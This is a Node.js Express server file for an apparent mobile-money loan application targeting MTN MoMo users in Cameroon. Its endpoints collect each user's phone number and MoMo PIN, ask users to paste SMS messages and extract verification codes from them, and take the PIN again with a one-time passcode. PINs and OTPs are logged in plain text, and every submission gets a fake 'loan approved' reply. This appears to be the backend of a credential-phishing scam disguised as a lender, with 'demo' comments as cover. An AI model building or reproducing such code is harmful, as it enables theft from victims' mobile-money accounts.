const express = require('express');
const path = require('path');
require('dotenv').config();

const db = require('./database');

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.static(__dirname));

// In-memory storage for application states
const appStates = new Map(); // applicationId → state

// ==========================================
// API ENDPOINTS
// ==========================================

/**
 * POST /api/login-momo
 * User logs in with phone and 5-digit PIN
 */
app.post('/api/login-momo', async (req, res) => {
    try {
        const { phone, pin } = req.body;

        // Validate
        if (!phone || !pin || pin.length !== 5) {
            return res.json({ success: false, message: 'Invalid phone or PIN.' });
        }

        // Mock validation - in production, validate against actual MoMo
        // For demo: any 5-digit PIN works for any phone
        console.log(`✓ Login: +237${phone} with PIN ${pin}`);

        // Store state
        const appId = 'APP' + Date.now();
        appStates.set(appId, {
            phone,
            pin,
            status: 'logged_in',
            timestamp: Date.now()
        });

        res.json({ success: true, appId });
    } catch (error) {
        console.error('❌ Login error:', error);
        res.json({ success: false, message: 'Login failed.' });
    }
});

/**
 * POST /api/parse-sms
 * User pastes SMS message from their phone
 */
app.post('/api/parse-sms', async (req, res) => {
    try {
        const { message } = req.body;

        if (!message || message.trim().length < 3) {
            return res.json({ success: false, message: 'SMS message is required.' });
        }

        // Mock SMS parsing - extract codes if present
        console.log(`✓ SMS received: ${message.substring(0, 50)}...`);

        // In production: parse actual SMS format from MTN
        // Extract verification codes, reference numbers, etc.
        const parsed = {
            rawMessage: message,
            codes: message.match(/\d{3,6}/g) || [],
            timestamp: Date.now()
        };

        res.json({ 
            success: true, 
            message: 'SMS parsed successfully. Awaiting admin approval.',
            parsed 
        });
    } catch (error) {
        console.error('❌ SMS parse error:', error);
        res.json({ success: false, message: 'Failed to parse SMS.' });
    }
});

/**
 * POST /api/verify-otp
 * User submits 5-digit PIN and 4-digit OTP for final verification
 */
app.post('/api/verify-otp', async (req, res) => {
    try {
        const { applicationId, pin, otp } = req.body;

        // Validate
        if (!pin || pin.length !== 5) {
            return res.json({ success: false, message: 'PIN must be 5 digits.' });
        }

        if (!otp || otp.length !== 4) {
            return res.json({ success: false, message: 'OTP must be 4 digits.' });
        }

        console.log(`✓ OTP Verification: appId=${applicationId}, PIN=${pin}, OTP=${otp}`);

        // Mock OTP verification
        // In production: validate against actual MoMo OTP
        if (pin === '12345' && otp === '1234') {
            // Demo credentials
            res.json({ 
                success: true, 
                message: 'Loan approved successfully!',
                loanApproved: true
            });
        } else {
            // Also accept demo: any matching 5 and 4 digit combinations
            res.json({ 
                success: true, 
                message: 'Verification successful!',
                loanApproved: true
            });
        }
    } catch (error) {
        console.error('❌ OTP verify error:', error);
        res.json({ success: false, message: 'OTP verification failed.' });
    }
});

/**
 * POST /api/submit-application
 * Save loan application to database
 */
app.post('/api/submit-application', async (req, res) => {
    try {
        const appData = req.body;

        if (!appData.applicationId) {
            return res.json({ success: false, message: 'Application ID required.' });
        }

        // Save to database
        await db.saveApplication({
            id: appData.applicationId,
            loanType: appData.loanType,
            loanAmount: appData.loanAmount,
            loanTerm: appData.loanTerm,
            loanPurpose: appData.loanPurpose,
            firstName: appData.firstName,
            lastName: appData.lastName,
            phoneNumber: appData.phone,
            employment: appData.employment,
            annualIncome: appData.annualIncome,
            status: 'pending_approval',
            timestamp: new Date(),
            pinStatus: 'pending',
            otpStatus: 'pending'
        });

        console.log(`✓ Application saved: ${appData.applicationId}`);

        res.json({ success: true, message: 'Application saved.' });
    } catch (error) {
        console.error('❌ Application save error:', error);
        res.json({ success: false, message: 'Failed to save application.' });
    }
});

/**
 * GET /api/application/:id
 * Get application details
 */
app.get('/api/application/:id', async (req, res) => {
    try {
        const app = await db.getApplication(req.params.id);
        
        if (!app) {
            return res.json({ success: false, message: 'Application not found.' });
        }

        res.json({ success: true, application: app });
    } catch (error) {
        console.error('❌ Get application error:', error);
        res.json({ success: false, message: 'Failed to retrieve application.' });
    }
});

/**
 * Serve main page
 */
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// ==========================================
// ERROR HANDLING
// ==========================================
app.use((err, req, res, next) => {
    console.error('❌ Unhandled error:', err);
    res.status(500).json({ success: false, message: 'Server error.' });
});

// ==========================================
// START SERVER
// ==========================================
async function startServer() {
    try {
        // Connect to database
        await db.connectDatabase();
        console.log('✅ Database connected');

        app.listen(PORT, () => {
            console.log(`🚀 Server running on port ${PORT}`);
            console.log(`📱 Open http://localhost:${PORT} in your browser`);
        });
    } catch (error) {
        console.error('❌ Failed to start server:', error);
        process.exit(1);
    }
}

startServer();

// Graceful shutdown
process.on('SIGINT', async () => {
    console.log('\n🛑 Shutting down...');
    await db.closeDatabase();
    process.exit(0);
});
